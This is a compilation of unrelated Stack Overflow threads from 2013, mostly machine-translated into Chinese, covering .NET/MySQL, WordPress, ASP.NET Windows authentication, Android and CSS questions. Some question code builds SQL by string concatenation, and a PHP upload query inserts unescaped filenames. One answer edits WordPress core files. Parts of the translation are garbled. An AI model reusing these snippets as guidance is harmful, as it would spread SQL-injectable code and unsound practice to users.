我正在尝试从 .Net 应用程序运行此查询

```
LOAD DATA LOCAL INFILE 'testsFile.txt' 
INTO TABLE Test  
FIELDS TERMINATED BY ','  
OPTIONALLY ENCLOSED BY '"'  
LINES TERMINATED BY '\n'  
IGNORE 1 LINES  
(idTest, SampleID, Analyst, @Analysed, Device, Comments, @TotalRUL, @RULOne, @RULTwo, @RULThree, @RULFour, Uploaded) 
SET  
Analysed = nullif(@Analysed,''), 
TotalRUL = nullif(@TotalRUL,''), 
RULOne = nullif(@RULOne,''), 
RULTwo = nullif(@RULTwo,''), 
RULThree = nullif(@RULThree,''), 
RULFour = nullif(@RULFour,'') 
```

当我从 MySQL Workbench 运行此查询时，一切正常，但是当我使用我的 .net 应用程序运行查询时，出现以下异常：

> 必须定义参数“@Analysed”。

我认为我不能在存储过程之外使用声明语句，并且由于使用了 LOAD DATA 语句，我不能使用存储过程

该怎么办？这是将军吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T08:49:26.737

你当然不能。如果您的查询适用于 Workbench，这听起来像是一个 .net 错误。我建议您尝试“愚蠢”的解决方案，例如使用反引号（在 @ 之后和已分析之后......对不起，堆栈溢出自动格式化不允许我向您展示我的意思）或更改变量的名称。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-26T01:52:45.973

[How to use MySQL user-variables with ADO.NET](https://stackoverflow.com/questions/4929792/how-to-use-mysql-user-variables-with-ado-net) 似乎有答案我需要在连接字符串中添加“允许用户变量”

# wordpress - 动态维护虚拟页面 URL，无需从管理员创建页面

> ID：16184677
> 
> 赞同：0
> 
> 时间：2013-04-24T06:16:47.823
> 
> 标签：wordpress

我创建了一个名为**UserName**的页面，其 URL 为`http://my_site/username/`. 在这个页面上，我展示了三个链接，每个链接都表现为**UserName的****元信息**。

 **让我们假设：

如果**UserName**包含有关 User 的信息，则三个链接是：

1.  关于我
2.  图片
3.  视频

和链接包含像这样的href：

1.  `http://my_site/username/about_me`
2.  `http://my_site/username/images`
3.  `http://my_site/username/videos`

现在我创建了三个通用文件，例如：

1.  about_me.php
2.  图像.php
3.  视频.php

并希望通过检查 URL 来包含这些文件，但我不知道如何。

我没有从 wp-admin 添加新页面就做到了，因为会有很多**UserName**页面，但它们都有相同的三个链接，并且会显示有关各个**用户**的信息。

如果我更喜欢创建**关于我**的子页面，其父页面将是**UserName**页面，那么管理员将需要创建**3*(n UserName)**页面，其中**n**最小值为**100**，可能为**1000s**

但是当我点击任何链接 WP 说

> 网页未找到
> 
> 这有点尴尬，不是吗？

我`Custom Structure`从**设置**中选择，我对 WP 永久链接一无所知。

> 您可能会打电话给我需要为所有用户创建**虚拟**页面。

如果不可能，那么在添加新的**用户名**页面时，是否有可能在已发布的三个页面（**关于我**、**图像**和**视频**）上自动使用父页面新的**用户名**页面和定义的**页面模板**。如果有可能那怎么办？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T11:33:56.220

哇，我有了一个想法，实施并欢呼它奏效了。

在`wp-admin/includes/post.php`我添加我的脚本`function edit_post( $post_data = null )`

首先，我检查帖子是否不存在，然后运行我的脚本：

```
$post = array(
          'comment_status' => 'closed',
          'ping_status'    => 'closed',
          'post_author'    => $current_user_id,
          'post_date'      => date('Y-m-d H:i:s'),
          'post_date_gmt'  => date('Y-m-d H:i:s'),
          'post_name'      => 'Image',
          'post_parent'    => $post_parent,
          'post_status'    => 'publish',
          'post_title'     => 'Image',
          'post_type'      => 'page'
        );
        // Insert in to WP wp_posts table
        $this_post_id = wp_insert_post( $post, $wp_error ); 
        // Insert in to wp_postmeta table
        $meta_id = update_post_meta($this_post_id , '_wp_page_template', 'page-three-columns.php'); 
```**

# facebook - Facebook 调试器响应代码 302

> ID：16184678
> 
> 赞同：1
> 
> 时间：2013-04-24T06:17:06.310
> 
> 标签：facebook, facebook-graph-api, response.redirect, facebook-sharer, http-status-code-302

看起来那个 facebook 刮板无法检测到我的页面，它说

> 响应代码是：302

当我点击查看爬虫从我的 URL 链接中看到的内容时，它说：

> 文档未返回数据

我已经使规范 URL 链接上的所有 og 元标记都可以正常工作，我想这一定是一些重定向问题，因为响应代码表明了这一点。这是我的主页和其他页面上的相同错误。

因此，我无法通过在 facebook 上分享 URL 来分享我网站的任何内容。

我会很感激任何帮助，谢谢。

# c# - 如何在 c# 中通过鼠标禁用 Tab Control 选项卡之间的移动

> ID：16184679
> 
> 赞同：-5
> 
> 时间：2013-04-24T06:17:09.420
> 
> 标签：c#, .net, winforms, controls, tabcontrol

我想使用导航按钮在选项卡控件上的选项卡之间移动，并且我不希望用户尝试使用鼠标在选项卡之间移动，我该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T06:28:25.650

这真的没有多大意义。

除了完全禁用鼠标光标之外，我不知道您将如何实现这一点。即使有一种方法可以“忽略”选项卡控制选项卡上的鼠标点击，那也会是*非常*糟糕的 UI。就用户而言，您的应用程序会被严重破坏——<em>“我尝试在所有其他应用程序中做同样的事情，但这个只是坐在这里，就像它已经死了一样。愚蠢的错误程序。”

所以这是一个非首发。如果这里的目标是强制用户以特定顺序浏览选项卡（如向导），那么我建议完全隐藏选项卡。这样用户就不会想点击它们或以任意顺序在它们之间切换。您必须通过设置`SelectedTab`or`SelectedIndex`属性来控制选项卡切换。这还将为您提供一个在切换选项卡时运行所需的任何其他代码的地方。

您将在此处找到有关如何在[Hans 的回答](https://stackoverflow.com/a/6954785/366904)中隐藏 TabControl 上的选项卡的说明。

# c# - How do I get the currently loggedin Windows account from an ASP.NET page?

> ID：16184685
> 
> 赞同：23
> 
> 时间：2013-04-24T06:17:52.590
> 
> 标签：c#, asp.net, vb.net, security, windows-identity

I have an ASP.NET 3.5 application that uses ASP.NET forms authentication. I want to be able to get the Windows user name currently logged into the computer (NOT logged into the ASP.NET application, but into Windows) when data is edited in a page.

If I use `Context.User.Identity.Name.Tostring()`, I get the user name logged into the ASP.NET application, but I need the Windows account name.

```
System.Security.Principal.WindowsIdentity.GetCurrent().Name.Tostring() 
```

Also, it only works when I run the website from Visual Studio, but after deploying to IIS it returns **NT AUTHORITY\SYSTEM**.

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-04-24T06:26:14.120

您必须`Windows`在配置中将身份验证模式设置为并在授权标签中禁用匿名用户。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2013-04-24T06:24:46.140

要将当前登录的用户获取到 Windows 帐户，您必须使用`Windows authentication`而不是`Forms authentication`：

> System.Security.Principal.WindowsIdentity.GetCurrent().Name.Tostring() 也仅在我从 Visual Studio 运行网站时有效，但在部署到 IIS 后它返回 NT AUTHORITY\SYSTEM

它显示应用程序当前用户。当您在 Visual Studio Web 服务器上托管应用程序时，它使用您的本地帐户。但是，当您使用不同的凭据登录 Web 应用程序时，它将始终显示您当前的 Windows 登录信息。

在您的情况下，部署到 IIS 的应用程序使用 NT AUTHORITY\SYSTEM 帐户。

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2016-03-29T12:23:33.820

要在 C# 中获取当前登录的用户到 Windows，请使用：

```
string Username = System.Security.Principal.WindowsIdentity.GetCurrent().Name.ToString(); 
```

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2017-08-07T18:09:35.777

我为此挣扎，挣扎，挣扎。其中一件事是我无法访问已锁定的 IIS，因此我无法更改任何服务器设置。我不得不去做我能够在代码中做的事情。当我研究它时，许多回复说，“这样设置IIS”。. .嗯，当您可以访问 IIS 时，这很好，但我没有——我必须使用我可以在代码中做的事情。所以，我最终像这样处理它：

在我的 Web 配置文件中，我在该部分中添加了以下代码行：

```
<system.webServer>
<security>
  <authentication>
    <anonymousAuthentication enabled="false" />
    <windowsAuthentication enabled="true" />
  </authentication>
</security>
</system.webServer> 
```

然后，它在我的本地返回一个错误，我必须进去修复。我转到位于我机器上以下路径中的 applicationhost.config 文件（您的可能不同）：

C:\users\"你的用户名"\My Documents\"yourIISInstallation"\config\applicationhost.config

我将以下设置更改为“允许”，该设置已设置为“拒绝”：

```
<section name="anonymousAuthentication" overrideModeDefault="Deny" /> 
```

变成

```
<section name="anonymousAuthentication" overrideModeDefault="Allow" /> 
```

和

```
<section name="windowsAuthentication" overrideModeDefault="Deny" /> 
```

至

```
<section name="windowsAuthentication" overrideModeDefault="Allow" /> 
```

在里面

```
<sectionGroup name="authentication"> 
```

部分。在我发现这个修复之前，我把头发拉出来了。我希望这可以帮助别人。一旦我将上面的代码放入 webconfig 文件中，它就可以在内网上运行，它只是在我的本地返回错误，但是一旦我将上面的代码添加到我的本地 applicationhost.config 文件中，它就开始在我的本地运行也是。然后，我调用了以下变量来返回 windows 上登录用户的名称：

```
 HttpContext.Current.User.Identity.Name.ToString().Substring((HttpContext.Current.User.Identity.Name.ToString().IndexOf("\\")) + 1); 
```

干杯!

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2013-04-24T06:27:39.413

我用这个：

```
System.Security.Principal.WindowsPrincipal user;
user = new WindowsPrincipal(this.Request.LogonUserIdentity);
this.Request.LogonUserIdentity.Impersonate();
user_name = user_name.Substring(user_name.LastIndexOf("\\") + 1); 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-04-24T06:19:52.803

```
string strName = HttpContext.Current.User.Identity.Name.ToString(); 
```

就像您希望的那样是正确的，但是您需要先设置网络服务器，*[请参阅如何使用 ASP.NET 获取 Window NT 记录的用户名](http://www.codeproject.com/Articles/12614/How-to-Get-Window-NT-Logged-User-Name-Using-ASP-NE)*（设置网络服务器的第一步）。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-04-24T06:24:14.717

尝试使用以下代码行：

```
string loggedOnUser = string.Empty;
 loggedOnUser = Request.ServerVariables.Get("AUTH_USER"); 
```

当您从 Visual Studio 运行应用程序时，您可能无法获取这些值...在 IIS 中部署后检查它。

要获取用户名，请使用：

```
string userName = string.Empty;
using (PrincipalContext pc = new PrincipalContext(ContextType.Domain, "Your Domain Name"))
{
    UserPrincipal user = new UserPrincipal(pc);
    user = UserPrincipal.FindByIdentity(pc, "User ID Will Come here");
    if (user != null)
    {
        userName = user.GivenName + " " + user.Surname;

    }
    else
    {
        //return string.Empty;
        userName = "User Not Found";
    }
} 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2018-06-11T08:43:27.857

我设法按照以下链接中方法 1 中的说明解决了此问题 - [https://support.microsoft.com/en-us/help/896861/you-receive-error-401-1-when-您浏览使用集成的网站](https://support.microsoft.com/en-us/help/896861/you-receive-error-401-1-when-you-browse-a-web-site-that-uses-integrate) 简而言之，禁用除 Windows 身份验证之外的所有身份验证方法。在管理员帐户下打开 regedit，找到 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0，右键单击节点并选择新建，然后选择多字符串值。输入“BackConnectionHostNames”并单击 Enter。对于值，输入您尝试设置访问权限的网站，然后单击确定。重新启动 IIS 完成后，我可以使用 HttpContext.Current.User.Identity.Name 获取当前 Windows 用户，WindowsPrincipal(this.Request.LogonUserIdentity) 也让我获得了登录的 Windows 用户名。供参考 System.Environment .UserName 和 System.Security.Principal.WindowsIdentity.GetCurrent().Name，这两个仍然给 IIS 用户。

这花了我很长时间才弄清楚。祝你好运。IIS 是一场醒着的噩梦！

# c# - Populating a Datagrid with records between a date and time period - Using C# and OLE DB

> ID：16184687
> 
> 赞同：1
> 
> 时间：2013-04-24T06:18:04.983
> 
> 标签：c#, sql, datetime, datagrid, oledb

I'm experiencing difficulties filtering a set of data between two DateTime values.

For example: Retrieve all records From: 24/04/2013 3:54 PM; To: 24/04/2013 4:30 PM.

I'm programming in C# and using OLE DB to pull data from a Access Database. The 'To' and 'From' DateTime values are retrieved from DateTimePicker controls on a GUI. I'm trying to query data in 'receiveDateTime' field of my data source - it is stored in DateTime format in Access.

My code appears as follows:

```
string SQLQuery = "SELECT EmailID, ServerName, receiveDateTime, Type, status, received, processed"
                + "FROM EmailTable, EmailTypesTable, ServerTable, StatusTable"
                + "WHERE EmailTypesTable.emailTypeID = EmailTypesTable.EmailType "
                + "AND ServerTable.ServerID = EmailTable.serverID "
                + "AND StatusTable.statusID = EmailTable.statusID "
                + "AND EmailTable.receiveDateTime BETWEEN " 
                + fromDateTime.Value.ToString("g") + "AND " + toDateTime.Value.ToString("g")";

loadDataGrid(SQLQuery); 
```

Any solutions or advice would be much appreciate.

Thanks,

Allan.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T06:29:37.397

1-您似乎忘记了日期值**之间的单引号：**

```
string SQLQuery = "SELECT EmailID, ServerName, receiveDateTime, Type, status, received, processed"
                + "FROM EmailTable, EmailTypesTable, ServerTable, StatusTable"
                + "WHERE EmailTypesTable.emailTypeID = EmailTypesTable.EmailType "
                + "AND ServerTable.ServerID = EmailTable.serverID "
                + "AND StatusTable.statusID = EmailTable.statusID "
                + "AND EmailTable.receiveDateTime BETWEEN '" 
                + fromDateTime.Value.ToString("g") + "' AND '" + toDateTime.Value.ToString("g") +"' "; 
```

**2-如果您也使用参数化参数会更好：**

```
SqlConnection con = new SqlConnection(MyconnectionString);
con.Open();
string SQLQuery = "SELECT EmailID, ServerName, receiveDateTime, Type, status, received, processed"
            + "FROM EmailTable, EmailTypesTable, ServerTable, StatusTable"
            + "WHERE EmailTypesTable.emailTypeID = EmailTypesTable.EmailType "
            + "AND ServerTable.ServerID = EmailTable.serverID "
            + "AND StatusTable.statusID = EmailTable.statusID "
            + "AND EmailTable.receiveDateTime BETWEEN @dateFrom AND @dateTo";

SqlCommand cmd = new SqlCommand(SQLQuery );
cmd.Parameters.AddWithValue("@dateFrom", fromDateTime.Value.ToString("g"));
cmd.Parameters.AddWithValue("@dateTo", toDateTime.Value.ToString("g"));
SqlDataReader reader = cmd.ExecuteReader();
//... 
```

通过尝试直接在数据库中执行此查询，您可能已经猜到了这个问题

（我在这里使用过 SQLConnection、SQLCommand...，您需要根据您使用的连接更改该部分。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T23:49:47.913

对于将来在比较 DateTime 值时遇到此问题的任何人，将 C# DateTime 作为 OLE 自动化日期传递给数据库是可行的！

为了访问这个值，您使用 ToOADate() 方法。

例如：

```
SqlConnection con = new SqlConnection(MyconnectionString);
con.Open();
string SQLQuery = "SELECT EmailID, receiveDateTime " 
                + "WHERE EmailTable.receiveDateTime " 
                + "BETWEEN @dateFrom AND @dateTo";

SqlCommand cmd = new SqlCommand(SQLQuery );
cmd.Parameters.AddWithValue("@dateFrom", fromDateTime.Value.ToOADate());
cmd.Parameters.AddWithValue("@dateTo", toDateTime.Value.ToOADate()); 
```

这很奇怪，因为虽然 DateTime 值在 DataGrid 中以一般的 DateTime 格式出现，但数据库必须这样读取它们：

**一般日期时间格式：26/04/2013 9:47 AM**

**OLE 自动化日期：41390.4082198032**

感谢您为我指出正确的方向 noobob！

# php - 插入时文件名消失（文件上传）

> ID：16184692
> 
> 赞同：0
> 
> 时间：2013-04-24T06:18:14.813
> 
> 标签：php, mysql

```
foreach ($_FILES['files']['tmp_name'] as $key=>$value){
    $ads_table=ads_table;
    $path_to_save_db='ads/'.$_FILES['files']['name'][$key];
    $id="60";
    mysql_query("INSERT INTO $ads_table (ad_url)  VALUES ('$path_to_save_db')") or (mysql_error());
} 
```

这很好用！但是当我添加另一列“id”时

```
foreach ($_FILES['files']['tmp_name'] as $key=>$value){
    $ads_table=ads_table;
    $path_to_save_db='ads/'.$_FILES['files']['name'][$key];
    $id="60";
    mysql_query("INSERT INTO $ads_table (id,ad_url)  VALUES ('$id','$path_to_save_db')") or (mysql_error());
} 
```

它如何插入`id=>60 ad_url=>ads/:no file name:` ？

# android - 在我的应用程序中获取其他应用程序（进程）的上下文：Android

> ID：16184695
> 
> 赞同：2
> 
> 时间：2013-04-24T06:18:25.630
> 
> 标签：android, eclipse

在我的应用程序中，我需要访问其他已安装应用程序的上下文。是否可以使用任何应用程序的包名称获取上下文？

如果我正在访问其他应用程序的上下文，这会是什么安全问题吗？

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2014-07-09T13:02:32.610

试试[这个](http://developer.android.com/reference/android/content/Context.html#createPackageContext(java.lang.String,%20int))

```
public abstract Context createPackageContext (String packageName, int flags) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-12-24T10:12:59.933

它有点旧，无法访问其他应用程序上下文，但这是您在应用程序之间传递数据的方式：http: [//developer.android.com/guide/topics/providers/content-provider-basics.html](http://developer.android.com/guide/topics/providers/content-provider-basics.html)

# css - 使用 CSS 3 转换保存状态

> ID：16184696
> 
> 赞同：0
> 
> 时间：2013-04-24T06:18:30.067
> 
> 标签：css, css-animations, css-transforms

我想创建一个分为两部分的动画。我稍微解释一下。

我有一个矩形，在动画开始时，顶部会有一个要缩小的动画。在这个动画结束之后，我想保持这个状态，使用 js 来检测动画何时完成，并添加我的第二个动画收缩矩形的底部。目前，有两个动画，但不要记住之前的状态。

```
@-webkit-keyframes scale {
    100% {
        -webkit-transform-origin: 50% 100%;
        -webkit-transform: perspective(900px) rotateX(10deg);
    }
}
@-moz-keyframes scale {
    100% {
        -moz-transform-origin: 50% 100%;
        -moz-transform: perspective(900px) rotateX(10deg);
    }
}

.scale {
    -webkit-transform-origin: 50% 100%;
    -webkit-transform: perspective(900px) rotateX(10deg);

    -moz-transform-origin: 50% 100%;
    -moz-transform: perspective(900px) rotateX(10deg);
}

@-webkit-keyframes toto {
    100% {
        -webkit-transform-origin: 50% 0%;
        -webkit-transform: perspective(900px) rotateX(-10deg);
    }
}

@-moz-keyframes toto {
    100% {
        -moz-transform-origin: 50% 0%;
        -moz-transform: perspective(900px) rotateX(-10deg);
    }
}

.scale2 {
    background: purple !important;

    -webkit-animation: toto 1.4s ease forwards !important;
    -moz-animation: toto 1.4s ease forwards !important;
} 
```

**代码有点 jsfiddle：http: [//jsfiddle.net/JeremDsgn/Dfyam/2/](http://jsfiddle.net/JeremDsgn/Dfyam/2/)**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-10T17:46:11.263

我建议您使用[jQuery Transit](http://ricostacruz.com/jquery.transit/)之类的插件，因为它非常适合保存 css3 转换/转换的状态，尤其是在您计划制作大量动画时。这比维护一个大的 CSS 文件要容易得多。

例子：

```
//Initial settings on Window DIV
$('#window').css( { 'transformOrigin': '50% 100%', perspective: '900', rotateX: 10 } );

$('#yoyo').on("click", function () {

    $('#window').transition( { background: 'purple' }, 1400, 'in', function () {
        //Do any additional animations here, such as change the background again
        $('#window').delay(2000).transition( { background: 'blue' }, 3000, 'out');
    });    

}); 
```

## [JS 小提琴演示](http://jsfiddle.net/HPnZH/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-12T19:17:19.333

您可以执行以下两项操作之一：

### 将`from`or添加`0%`到您的第二个动画：

[http://jsfiddle.net/trolleymusic/y2Hxc/](http://jsfiddle.net/trolleymusic/y2Hxc/)

```
@-webkit-keyframes scale {
    100% {
        -webkit-transform-origin: 50% 100%;
        -webkit-transform: perspective(900px) rotateX(10deg);
    }
}
@-webkit-keyframes toto {
    from {
        -webkit-transform-origin: 50% 100%;
        -webkit-transform: perspective(900px) rotateX(10deg);
    }   
    to {
        -webkit-transform-origin: 50% 0%;
        -webkit-transform: perspective(900px) rotateX(-10deg);
    }
} 
```

### 或者在添加第二个转换之前使用 javascript 将当前转换属性作为内联样式添加到元素 - 我**认为**这就是您所说的想要的：

[http://jsfiddle.net/trolleymusic/TbwfC/](http://jsfiddle.net/trolleymusic/TbwfC/)

```
// Listener
$('window').addEventListener('webkitAnimationEnd', function() {
    this.style.webkitTransform = window.getComputedStyle(this)["-webkit-transform"];
    this.style.webkitTransformOrigin = window.getComputedStyle(this)["-webkit-transform-origin"];
    this.className = 'scale2';
}, false); 
```

因此，您从 获取当前变换矩阵和原点`window.getComputedStyle`，并将其应用于元素，然后再更改类名。

我删除了`-moz-`前缀行以使代码更短——正如**ROFLwTIME**指出的那样，它会很快变长。显然，使用第二种解决方案，您将不得不观察您如何在其他浏览器中实现它，因为它们需要读取各自的前缀或`transform`and的非前缀版本`transform-origin`。

### SASS 的快速插件

如果您担心 CSS 的复杂性和大小，我会考虑查看 SASS ( [http://sass-lang.com](http://sass-lang.com) ) 和 Compass ( [http://compass-style.org](http://compass-style.org) )，尤其是对于变换和动画。而不是写：

```
-webkit-transform: rotateX(10deg);
-moz-transform: rotateX(10deg);
-ms-transform: rotateX(10deg);
-o-transform: rotateX(10deg);
transform: rotateX(10deg); 
```

你写：

```
@include transform(rotateX(10deg)); 
```

SASS 会将所有这些行输出到您的 CSS 中。它使编写动画、变换和过渡更易于管理。

# java - android : Can we implement a single dialog showing error, if multiple activities in a flow crashes?

> ID：16184697
> 
> 赞同：3
> 
> 时间：2013-04-24T06:18:32.443
> 
> 标签：java, android, android-emulator

*   When a single activity crashes, all the activities in flow crashes.
*   As all activities crash, each generates its own error dialog, so can we have a single dialog for all crashes?
*   Try catch is already implemented.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T06:23:54.353

您使用单例静态最终对象来处理所有活动中的所有对话框。一个这样的单例对象是应用程序对象，请参阅[http://developer.android.com/reference/android/app/Application.html](http://developer.android.com/reference/android/app/Application.html)，但如果您不想使用，则不必使用该对象。

此外，您必须确保在任何地方都绝对实现 try/catch，无论 android 操作系统在哪里调用您的应用程序代码。我会发现我在代码中的大多数地方都有 try/catch，但不知何故，当我试图快速开发时，我不小心错过了一些地方，当然它们最终给我带来了问题！

# python - Python BUG or I don't get how encoding works? len, find, and re.search do nothing with no empty, successful subprocess.communicate() execution result

> ID：16184702
> 
> 赞同：0
> 
> 时间：2013-04-24T06:18:58.193
> 
> 标签：python, find, popen

For a reason I cannot understand I cannot do nothing with the output of Popen.communicate, except for print it to terminal.

If I save the output to a variable, the variable contains the text, because I can print it to terminal too, but len returns 0, re.search match nothing, and find always returns -1.

The offending function:

```
#!/usr/bin/env python
# coding: utf-8

import os
import sys
import getopt
import subprocess
import os.path
import re

def get_video_duration (ifile):
    p = subprocess.Popen(["ffprobe", ifile], stdout=subprocess.PIPE)
    info_str = p.communicate()[0].decode(sys.stdout.encoding)
    print(info_str) # for debug, the information about the file prints ok
    duration_start = info_str.find("Duration")
    # duration_start = "AJDKLAJSL Duration:".find("Duration"), this test was ok
    duration_end = info_str.find("start", duration_start)
    number_start = info_str.find(" ", duration_start, duration_end) + 1
    number_end = info_str.find(",", number_start, duration_end)

    temp = info_str[number_start:number_end].split(":")

    return int(temp[0]) * 60 * 60 + int(temp[1]) * 60 + int(temp[2])

```

I attempted different variations. Like do not use .decode(), change find for a single re.search, implement my own find by iterating each character (the problem is that I need len for this, and len always returns 0 for that particular string/byte_array).

It is a bug of some sort or I am doing something wrong about the string encoding. I cannot figure what exactly is the problem. Any help appreciated.

Ubuntu 12.10 64 bits Python 2.7

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T08:08:19.173

您在编码方面没有做错任何事情。您的问题是 ffprobe 将其输出（包括您正在寻找的持续时间信息）发送到标准错误，而不是标准输出。这样做，你应该没问题：

```
def get_video_duration (ifile):
    p = subprocess.Popen(["ffprobe", ifile], stderr=subprocess.PIPE)
    info_str = p.communicate()[1].decode(sys.stderr.encoding) 
```

您的 print() 调用*似乎*正常工作的原因是它没有打印任何内容（因为 info_str 确实是空的）......但是 stderr 输出被转储到控制台，这让您产生一种错觉，即您所看到的是您的 print() 调用的结果。

# android - 无法隐藏 SearchView 的虚拟键盘 iconfiedbydefault(false)

> ID：16184703
> 
> 赞同：5
> 
> 时间：2013-04-24T06:19:02.333
> 
> 标签：android, actionbarsherlock, searchview, optionmenu

我有一个搜索视图，默认情况下使用默认搜索查询设置为扩展，但我不想要虚拟键盘。在下面的代码中，我试图在**onCreateOptionsMenu**中隐藏键盘，但键盘仍然可见。

```
imm = (InputMethodManager)getSystemService(Context.INPUT_METHOD_SERVICE);
    MenuItem item = menu.findItem(R.id.menu_search);
    item.expandActionView();
    mSearchView = (SearchView) item.getActionView();
    mSearchView.setIconifiedByDefault(false);
    mSearchView.setQuery(query, true);
    imm.hideSoftInputFromWindow(mSearchView.getWindowToken(), 0); 
```

我正在使用夏洛克搜索视图小部件。任何隐藏虚拟键盘的建议。我做错了什么？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2014-03-06T10:14:08.230

受 Parnit 回答的启发，我找到了一种更好的方法，它也有效并且更漂亮：

```
mSearchView.clearFocus(); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-08-20T16:26:17.197

编辑：我在上面添加了更好的解决方案，但也保留了旧答案作为参考。

```
 @Override
        public boolean onQueryTextSubmit(String query) {

                  searchView.clearFocus();
            return false;
        } 
```

原始答案：我使用 setOnQueryTextListener 进行编程。当搜索视图被隐藏时，键盘消失，然后当它再次可见时，键盘不会弹回。

```
 //set query change listener
     searchView.setOnQueryTextListener(new SearchView.OnQueryTextListener(){
        @Override
        public boolean onQueryTextChange(String newText) {
            // TODO Auto-generated method stub
            return false;
        }

        @Override
        public boolean onQueryTextSubmit(String query) {
            /**
             * hides and then unhides search tab to make sure keyboard disappears when query is submitted
             */
                  searchView.setVisibility(View.INVISIBLE);
                  searchView.setVisibility(View.VISIBLE);
            return false;
        }

     }); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-04-24T06:37:05.333

尝试

```
getWindow().setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_HIDDEN); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-24T06:24:44.050

在特定活动的清单中添加以下行。

```
 android:windowSoftInputMode="adjustPan|stateHidden" 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2017-10-24T14:40:19.000

简单的解决方案它对我添加到 XML 的工作：

```
 android:focusable="false" 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-11-13T02:03:05.607

在 Android 清单中：

```
 android:windowSoftInputMode="adjustPan|stateHidden" 
```

在课堂上打开和关闭键盘：

```
 @Override
  public boolean onOptionsItemSelected(MenuItem item) {
      // Handle action buttons
      switch(item.getItemId()) {
case R.id.search:
         //TODO Whatever
          search.clearFocus();
         //Open and close the  keyboard
          InputMethodManager imm = (InputMethodManager)MyApplication.getAppContext().getSystemService(
                  Context.INPUT_METHOD_SERVICE);
          imm.toggleSoftInput(InputMethodManager.SHOW_FORCED, 0);
          imm.toggleSoftInput(InputMethodManager.SHOW_FORCED, 0);
          return true; 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2019-03-17T02:20:37.067

你只需要使用：“object(edittext, searchview, etc)”.clearfocus();

在您生成搜索或操作后使用它。示例：在 OnQueryTextListener 方法中，之后我使用搜索。对于搜索视图。

# php - PHP: How to pairing up an arrey values

> ID：16184710
> 
> 赞同：2
> 
> 时间：2013-04-24T06:19:40.477
> 
> 标签：php, arrays

Array is like..

```
array ( 
      [0] => a
      [1] => b
      [2] => c
      [3] => d
      [4] => e
      [5] => f
      [6] => g
      [7] => h
     ) 
```

I want pair them like..

```
Array 
( [0] => Array ( 
    [0] => a
    [1] => b)

  [1] => Array ( 
    [0] => c
    [1] => d) 

  [2] => Array ( 
    [0] => e
    [1] => f)

  [3] => Array ( 
    [0] => g
    [1] => h)
) 
```

How can i do this? there are 8 values and I want 4 pairs from these 8 values. I am new to php so I don't really knw much about php and I searched google but can't find a solution for this.

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-24T06:20:47.640

您可以使用[`array_chunk()`](http://php.net/array_chunk)：

```
print_r(array_chunk($arr, 2)); 
```

[**演示**](http://codepad.viper-7.com/uxiEQW)

# jsp - BigDecimal 字段的验证

> ID：16184722
> 
> 赞同：-1
> 
> 时间：2013-04-24T06:20:18.280
> 
> 标签：jsp, spring-mvc, validation

我正在尝试使用 spring mvc+jpa hibernate 在我的项目中验证 BigDecimal 字段。字段名称为：private BigDecimal totalAreaInAcres；

jsp中的输入字段是：

```
<p>
<label for="totalAreaInAcres">Total Area in acres</label>
<form:input path="totalAreaInAcres"/>
<form:errors path="totalAreaInAcres" cssClass="error"></form:errors>
</p> 
```

现在，使用服务器端验证来验证此输入字段：

```
BigDecimal area=layout.getTotalAreaInAcres();

System.out.println("area="+area);

String areaInString=area.toString();
System.out.println("area in string="+areaInString);

 if(areaInString==null)
{
    ValidationUtils.rejectIfEmptyOrWhitespace(errors, "totalAreaInAcres",
            "field.name.empty",
            "Enter Total area in acres");
} 
```

此字段应在输入任何字符时显示错误消息。当我输入数字时，它已成功添加到数据库中，但是当我添加字符时，它会抛出 NullPointerException。这是我的堆栈跟踪：

```
SEVERE: Servlet.service() for servlet [Spring MVC Dispatcher Servlet] in context with       path [/TalentCity] threw exception [Request processing failed; nested exception is    java.lang.NullPointerException] with root cause
java.lang.NullPointerException
at     in.corasent.talentcity.utils.AddLayoutValidator.validateLayout(AddLayoutValidator.java:40)
at    in.corasent.talentcity.web.adminControllers.AddLayout.postLayoutDetails(AddLayout.java:57)
at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
at java.lang.reflect.Method.invoke(Method.java:616)
at    org.springframework.web.method.support.InvocableHandlerMethod.invoke(InvocableHandlerMethod.java:213)
at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:126)
at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:96)
